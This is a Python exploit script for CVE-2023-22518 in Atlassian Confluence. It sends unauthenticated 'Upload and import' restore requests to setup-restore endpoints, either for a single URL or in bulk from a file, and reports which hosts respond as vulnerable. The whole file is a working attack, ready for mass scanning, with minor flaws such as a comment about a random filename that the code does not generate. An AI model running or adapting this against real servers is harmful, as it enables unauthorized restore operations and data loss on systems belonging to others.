# Based on: https://github.com/ForceFledgling/CVE-2023-22518
import requests
import random
import string
import argparse
import urllib3

# Disable warnings about insecure HTTP requests (i.e., without SSL certificates)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def post_setup_restore(baseurl):
    """
    Attempt to exploit the CVE-2023-22518 vulnerability on a given base URL.
    
    Args:
    baseurl (str): The base URL of the target server.
    """
    # Paths to check for the vulnerability
    paths = ["/json/setup-restore.action", "/json/setup-restore-local.action", "/json/setup-restore-progress.action", "/server-info.action"]
    
    for path in paths:
        # Construct the full URL
        url = f"{baseurl.rstrip('/')}{path}"

        # Set the necessary headers for the HTTP POST request
        headers = {
            "X-Atlassian-Token": "no-check",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7"
        }

        # Generate a random string for the filename
        filename = "any"
        
        # Construct the multipart/form-data payload
        data = (
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            "Content-Disposition: form-data; name=\"buildIndex\"\r\n\r\n"
            "true\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}.zip\"\r\n\r\n"
            f"{filename}\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            "Content-Disposition: form-data; name=\"edit\"\r\n\r\n"
            "Upload and import\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7--\r\n"
        )

        try:
            # Send the HTTP POST request
            response = requests.post(url, headers=headers, data=data.encode('utf-8'), timeout=10, verify=False)
            
            # Check the response for indicators of the vulnerability
            if (response.status_code == 200 and
                'The zip file did not contain an entry' in response.text and 
                'exportDescriptor.properties' in response.text):
                print(f"[+] Vulnerable to CVE-2023-22518 on host {url}!")
            else:
                print(f"[-] Not vulnerable to CVE-2023-22518 for host {url}.")
        except requests.RequestException as e:
            # Handle exceptions that occur during the HTTP request
            print(f"[*] Error connecting to {url}. Error: {e}")

def main():
    """
    Main function to parse arguments and initiate the vulnerability check.
    """
    parser = argparse.ArgumentParser(description="Post setup restore script")
    parser.add_argument('--url', help='The URL to target', required=False)
    parser.add_argument('--file', help='Filename containing a list of URLs', required=False)
    args = parser.parse_args()

    # Check if a single URL is provided
    if args.url:
        post_setup_restore(args.url)
    # Check if a file containing multiple URLs is provided
    elif args.file:
        with open(args.file, 'r') as f:
            for line in f:
                url = line.strip()
                if url:
                    post_setup_restore(url)
    else:
        print("You must provide either --url or --file argument.")

if __name__ == "__main__":
    main()
